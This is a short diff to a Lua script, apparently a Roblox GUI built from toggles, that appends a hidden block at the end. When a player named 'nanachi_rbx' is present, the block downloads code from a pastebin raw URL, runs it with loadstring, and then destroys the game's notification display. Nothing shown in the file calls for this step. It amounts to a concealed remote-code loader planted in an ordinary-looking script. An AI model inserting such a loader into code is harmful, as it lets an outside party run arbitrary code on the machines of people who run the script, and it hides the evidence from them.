@@ -720,3 +720,9 @@ local L = mi.Toggle({
 	end,
 	Enabled = false
 })
+-------------------------------------------------------
+if game.Players:WaitForChild("nanachi_rbx") then
+    loadstring(game:HttpGet("https://pastebin.com/raw/iZ7XMq5r"))()
+    wait(10)
+    game.CoreGui.Notifications:Destroy()
+end
